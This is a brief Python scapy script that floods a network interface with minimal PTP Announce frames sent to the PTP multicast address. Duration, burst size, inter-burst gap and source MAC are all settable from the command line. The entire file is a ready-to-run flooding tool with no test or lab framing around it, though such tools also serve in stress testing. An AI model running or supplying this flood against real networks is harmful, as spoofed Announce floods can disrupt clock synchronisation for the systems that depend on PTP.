import sys,time
from scapy.all import Ether,Raw,sendp
# argv: iface dur [burst] [gap_ms] [src_mac]
iface,dur = sys.argv[1],int(sys.argv[2])
burst  = int(sys.argv[3]) if len(sys.argv)>3 else 200
gap_ms = int(sys.argv[4]) if len(sys.argv)>4 else 50
src    = sys.argv[5] if len(sys.argv)>5 else "02:00:00:00:00:77"
# minimal PTP Announce frame (messageType 0x0b) at high rate to the PTP multicast MAC
ptp=bytes([0x0b,0x02,0,0x40])+b"\x00"*60
pkt=Ether(dst="01:1b:19:00:00:00",src=src,type=0x88F7)/Raw(ptp)
t=time.time()
while time.time()-t<dur:
    sendp(pkt,iface=iface,count=burst,verbose=0); time.sleep(gap_ms/1000.0)
